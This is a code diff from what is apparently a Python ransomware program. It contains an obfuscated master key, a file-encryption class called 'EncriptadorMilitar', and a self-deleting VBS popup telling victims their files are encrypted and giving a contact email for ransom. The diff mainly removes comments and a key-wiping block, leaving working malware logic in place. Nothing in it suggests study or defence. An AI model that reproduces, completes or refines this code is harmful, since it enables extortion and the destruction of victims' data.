@@ -8,17 +8,12 @@ import base64
 import zlib
 
 
-# ═══════════════════════════════════════════════════════════
-# 🔐 KEY OFUSCADA (Triple capa: Zlib + XOR + Base64)
-# ═══════════════════════════════════════════════════════════
-
 def _xor(data, key=0xAB):
     return bytes(b ^ key for b in data)
 
 def _get_master_key():
-    """Decode master key at runtime"""
     try:
-        _k = base64.b64decode(b'0zf4XpidYt8G+yKhpdzlIN9k26DjJoOe/l0dY6bfg1iagaMZh9qZgFz52JpkWJuF3Z+HXp9jJJ8CoWoJufaUERKrUhWKLw==')
+        _k = base64.b64decode("0zf4XpidYt8G+yKhpdzlIN9k26DjJoOe/l0dY6bfg1iagaMZh9qZgFz52JpkWJuF3Z+HXp9jJJ8CoWoJufaUERKrUhWKLw==")
         _k2 = _xor(_k, 0xAB)
         _k3 = zlib.decompress(_k2)
         return _k3
@@ -55,7 +50,6 @@ def crear_vbs_notificacion(ruta_archivo):
         vbs_content = """On Error Resume Next
 MsgBox "Your files have been encrypted. Contact: onder01@tutamail.com", vbCritical + vbSystemModal, "Encrypted"
 
-' Auto-eliminar este VBS después de 3 segundos
 Dim fso, scriptPath
 Set fso = CreateObject("Scripting.FileSystemObject")
 scriptPath = WScript.ScriptFullName
@@ -149,7 +143,6 @@ class EncriptadorMilitar:
             num_capas, tipo_capas = self._determinar_capas(tamano)
             self.stats[tipo_capas] += 1
             
-            # ✅ SALT ÚNICO POR ARCHIVO (derivado del contenido + random)
             file_salt = hashlib.sha256(datos[:min(4096, len(datos))] + os.urandom(32)).digest()
             file_master = self._derive_key(MASTER_KEY_FIXED, file_salt, b'file_master', 64)
             
@@ -251,14 +244,10 @@ class EncriptadorMilitar:
                 claves_usadas.extend([key_a3, nonce_a3])
             
             claves_flat = self._flatten_keys(claves_usadas)
-            
-            # ✅ METADATA SIN file_master (solo file_salt)
             metadata = num_capas.to_bytes(1, 'big') + file_salt + claves_flat
-            
             hmac_key = self._derive_key(MASTER_KEY_FIXED, b'hmac_salt', b'hmac_key', 64)
             h = hmac.new(hmac_key, metadata + datos, hashlib.sha3_512)
             firma = h.digest()
-            
             resultado = (
                 struct.pack('>I', len(metadata)) +
                 metadata +
@@ -284,10 +273,3 @@ class EncriptadorMilitar:
 
 Encriptador = EncriptadorMilitar
 CRYPTO_OK = _import_crypto() is not None
-
-# Limpiar MASTER_KEY de memoria después de cargar
-import gc
-if 'MASTER_KEY_FIXED' in dir():
-    MASTER_KEY_FIXED = os.urandom(len(MASTER_KEY_FIXED))
-    del MASTER_KEY_FIXED
-    gc.collect()
